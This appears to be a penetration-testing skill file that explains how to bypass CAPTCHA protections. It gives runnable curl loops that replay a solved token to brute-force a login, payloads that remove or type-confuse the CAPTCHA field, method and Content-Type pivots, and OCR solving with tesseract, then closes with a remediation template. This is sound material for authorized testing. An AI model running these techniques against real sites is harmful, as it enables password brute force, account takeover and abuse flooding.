---
name: bypassing-captcha-protections
description: Identifying weaknesses in CAPTCHA implementations and bypassing them via replay, field removal,
  method/content-type manipulation, missing server-side validation, and weak OCR-solvable challenges to defeat
  anti-automation controls.
domain: cybersecurity
subdomain: web-application-security
tags:
- penetration-testing
- captcha
- anti-automation
- bot-protection
- bruteforce
- web-security
version: '1.0'
author: Krishna Kumar (xalgord)
license: Apache-2.0
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
---

# Bypassing CAPTCHA Protections

## When to Use

- During authorized penetration tests where CAPTCHA is the control protecting login, registration, password reset, contact forms, OTP, checkout, or voting endpoints
- When assessing whether a CAPTCHA actually prevents automation/brute-force or is merely cosmetic (client-side only)
- When validating that CAPTCHA tokens are single-use, time-bound, and verified server-side and bound to the session
- For demonstrating that rate-limiting / abuse controls collapse once the CAPTCHA is removed
- During bug bounty programs targeting broken anti-automation and authentication controls

## Prerequisites

- **Authorization**: Written penetration testing agreement; CAPTCHA bypass enables high-volume requests, so confirm rate-limit scope
- **Burp Suite**: Repeater for single-request tampering, Intruder/Turbo Intruder for replay/brute-force confirmation
- **Browser dev tools**: To strip client-side validation and inspect how the CAPTCHA is wired into the form
- **An OCR/solver toolkit**: tesseract for weak image CAPTCHAs; a solver service only if in scope
- **Two captured valid submissions**: A baseline (with a freshly solved CAPTCHA) to diff against bypass attempts

## Critical: Checks Most Often Missed

CAPTCHA bypasses are usually logic flaws, not AI solving. Before trying to
*solve* the challenge, try to make it *irrelevant*. Work this checklist:

- **Token replay (most common, most missed).** Solve the CAPTCHA once, capture
  the request, then resend the SAME captcha token/response value many times. If
  more than one request succeeds, the token is not single-use — full bypass.
- **Old session / old token reuse.** Reuse a captcha value from a previous
  session or a much older request. If still accepted, validation ignores
  freshness and session binding.
- **Remove the field entirely.** Delete the `g-recaptcha-response` /
  `captcha` / `h-captcha-response` parameter from the body (not blank — gone).
  Servers that only validate "if present" skip the check when it is absent.
- **Empty / null / type-confused value.** Send `captcha=`, `captcha=null`,
  `captcha=true`, `captcha=0`, or `captcha[]=` (array). Loose comparisons and
  missing-key handling frequently pass.
- **HTTP method change.** If the form is POST, try GET/PUT with the same params.
  CAPTCHA verification middleware is often wired to one method only.
- **Content-Type conversion.** Switch `application/x-www-form-urlencoded` to
  `application/json` (or multipart). The validation filter may only parse one
  body format and silently skip the captcha for the others.
- **Client-side-only enforcement.** If the page disables submit until solved but
  the server never verifies, simply submit directly with curl/Repeater — strip
  the JS check via dev tools to confirm the request goes through.
- **Static / retrievable challenge.** If the CAPTCHA image is served from a
  fixed/absolute path or the answer is in a cookie, hidden field, response
  header, or alt-text, fetch it directly. Same image on every load = trivially
  precomputed.
- **Weak OCR-solvable image.** Low-noise, fixed-font, fixed-length CAPTCHAs are
  pipeline-solvable with tesseract at high accuracy — automatable, not a control.
- **Verb/endpoint confusion on verify step.** Some flows verify the captcha on a
  separate `/verify` call and trust a flag afterward; skip straight to the
  protected action and see if the flag is assumed true.

## Workflow

### Step 1: Map How the CAPTCHA Is Wired In

Understand the type, where it is validated, and what parameter carries the answer.

```bash
# Capture a full, legitimate submission in Burp after solving the CAPTCHA once.
# Identify the CAPTCHA parameter name in the request body, e.g.:
#   reCAPTCHA v2:   g-recaptcha-response=03AGdBq2...
#   hCaptcha:       h-captcha-response=P0_eyJ...
#   custom:         captcha=AB3D9  /  captcha_token=...  /  captcha_id=...

# Note the type:
#   - Client-only widget with no server token check (weakest)
#   - Server-verified token (reCAPTCHA/hCaptcha -> /siteverify)
#   - Self-hosted image CAPTCHA (answer compared server-side)

# Check whether a captcha_id / challenge_id is sent alongside the answer —
# replay testing targets the (id, answer) pair.
```

### Step 2: Test Token Replay and Stale Tokens

The highest-yield check: is the token single-use and fresh?

```bash
# Baseline: solve once, capture the request, confirm it succeeds.
# Then resend the IDENTICAL request (same captcha value) repeatedly:
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST "https://target.example.com/login" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data 'username=admin&password=guess'"$i"'&g-recaptcha-response=03AGdBq2REUSEDTOKEN'
done
# Multiple 200/302 successes => token is replayable (single-use enforcement missing)

# Stale-token test: reuse a captcha value captured minutes/hours earlier, or from
# a different session cookie. If accepted, freshness/binding is not enforced.

# In Burp: Intruder with a null payload set on the password while pinning the
# same captcha token confirms brute-force is possible behind the CAPTCHA.
```

### Step 3: Remove, Empty, and Type-Confuse the Field

Make the server skip validation by malforming or omitting the parameter.

```bash
# (a) Field completely removed from the body:
curl -s -o /dev/null -w "removed:%{http_code}\n" \
  -X POST "https://target.example.com/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data 'username=admin&password=test'

# (b) Empty value:
--data 'username=admin&password=test&g-recaptcha-response='

# (c) null / boolean / zero (esp. with JSON body, see Step 5):
#   "g-recaptcha-response": null
#   "g-recaptcha-response": true
#   "g-recaptcha-response": 0

# (d) Array / parameter pollution:
--data 'g-recaptcha-response[]=&g-recaptcha-response=valid'
--data 'g-recaptcha-response=&g-recaptcha-response=valid'

# Any success (or absence of a captcha error) => server-side validation gap.
```

### Step 4: Change HTTP Method and Content-Type

CAPTCHA middleware is often bound to one method/parser only.

```bash
# Method change: original POST -> try GET / PUT with identical parameters
curl -s -o /dev/null -w "GET:%{http_code}\n" \
  "https://target.example.com/login?username=admin&password=test"

curl -s -X PUT -o /dev/null -w "PUT:%{http_code}\n" \
  "https://target.example.com/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data 'username=admin&password=test'

# Content-Type conversion: form -> JSON (captcha often only parsed for form data)
curl -s -X POST "https://target.example.com/login" \
  -H "Content-Type: application/json" \
  --data '{"username":"admin","password":"test"}'
# Note the captcha field omitted entirely in the JSON variant.

# multipart variant:
curl -s -X POST "https://target.example.com/login" \
  -F username=admin -F password=test
```

### Step 5: Defeat Client-Side-Only Enforcement

If the gatekeeping is purely in JavaScript, bypass by talking to the server directly.

```text
# In browser dev tools, confirm the control is client-side:
#  - The submit button is disabled until the widget callback fires
#  - Removing the 'disabled' attribute or calling the form submit directly works
#  - No server response distinguishes solved vs unsolved

# Confirm server does NOT verify by replaying the raw request without any token
# (Step 3a). If it succeeds, enforcement is client-side only -> trivially bypassed
# by scripted clients that never render the widget.
```

### Step 6: Attack Self-Hosted Image CAPTCHAs

For custom image CAPTCHAs, test static reuse, leaked answers, and OCR.

```bash
# (a) Static image / fixed path: fetch the image URL repeatedly; if identical
#     bytes every time, the challenge is precomputable.
curl -s "https://target.example.com/captcha/image" -o c1.png
curl -s "https://target.example.com/captcha/image" -o c2.png
cmp c1.png c2.png && echo "SAME IMAGE EVERY LOAD"

# (b) Answer leakage: inspect the captcha response for the plaintext answer in a
#     cookie, hidden field, JSON field, header, or image alt/title:
curl -s -D - "https://target.example.com/captcha/new" | grep -iE 'set-cookie|answer|captcha'

# (c) Absolute-path retrieval bypassing per-session binding:
#     /captcha/image?id=KNOWN_ID  -> precompute (id -> answer) offline

# (d) OCR weak images with tesseract:
tesseract c1.png stdout --psm 8 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
# Measure solve rate over 100 samples; high accuracy => not a real control.
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Token replay** | Reusing a single solved CAPTCHA response across many requests due to missing single-use enforcement |
| **Stale token** | A CAPTCHA value accepted long after issuance or from a different session (no freshness/binding) |
| **Field removal** | Omitting the CAPTCHA parameter so "validate if present" logic skips the check |
| **Type confusion** | Sending null/boolean/array values that pass loose server-side comparisons |
| **Method/Content-Type pivot** | Switching verb or body format to route past validation bound to one handler |
| **Client-side-only enforcement** | CAPTCHA gating done in JS with no server verification |
| **Static challenge** | Image/answer that does not change per request, enabling precomputation |
| **OCR-solvable** | Low-noise, fixed-font CAPTCHAs an automated pipeline can read reliably |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **Burp Suite (Repeater)** | Single-request tampering: remove field, swap method, change Content-Type |
| **Burp Intruder / Turbo Intruder** | Confirm replay and brute-force throughput once CAPTCHA is bypassed |
| **Browser dev tools** | Inspect widget wiring, strip client-side gating, submit directly |
| **tesseract OCR** | Solve weak self-hosted image CAPTCHAs and measure solve rate |
| **curl / httpie** | Scripted reproduction of removal/empty/method/content-type variants |
| **ffuf** | Confirm endpoint accepts high request volume after bypass |

## Common Scenarios

### Scenario 1: Replayable reCAPTCHA Token on Login
The login endpoint verifies `g-recaptcha-response` but does not mark it consumed. Capturing one solved token and pinning it in Burp Intruder enables unlimited password brute-force.

### Scenario 2: CAPTCHA Skipped for JSON Body
The form (`application/x-www-form-urlencoded`) is protected, but the same endpoint accepts `application/json` without any captcha field, so automated clients send JSON and bypass entirely.

### Scenario 3: Field Removal on Password Reset
Removing the `captcha` parameter from the reset request returns success; the server only checks the value when the key exists, enabling unlimited reset-email/OTP flooding.

### Scenario 4: Static Self-Hosted Image
The custom CAPTCHA serves the same image on every request and stores the answer in a readable cookie, letting a script read the answer directly without solving anything.

## Output Format

```
## CAPTCHA Bypass Finding

**Vulnerability**: Broken CAPTCHA / Anti-Automation Control Bypass
**Severity**: High (CVSS 7.3)
**Location**: POST /login  (parameter: g-recaptcha-response)
**OWASP Category**: A07:2021 - Identification and Authentication Failures

### Reproduction Steps
1. Solve the CAPTCHA once and capture the login request in Burp
2. Resend the identical request 10 times with the same g-recaptcha-response token
3. Observe all 10 requests succeed (token not single-use)
4. In Intruder, vary only the password while pinning the token -> brute-force confirmed

### Bypass Techniques Confirmed
| Technique | Result |
|-----------|--------|
| Token replay (same value x10) | Bypassed |
| Field removed from body | Bypassed |
| Content-Type form -> JSON | Bypassed |
| Empty value (captcha=) | Blocked |

### Impact
- Unlimited credential brute-force against /login behind a "protected" form
- Rate-limit/abuse controls rendered ineffective
- Enables password-reset and OTP flooding on related endpoints

### Recommendation
1. Verify the CAPTCHA token server-side on every request; reject when missing,
   empty, null, or wrong-typed.
2. Enforce single-use tokens with short expiry, bound to the session and action.
3. Apply CAPTCHA validation across all methods and content-types for the route.
4. Never rely on client-side gating alone; the server must be the source of truth.
5. Replace static/weak self-hosted image CAPTCHAs with a vetted provider or add
   strong distortion, randomization, and rate-limiting as defense in depth.
```
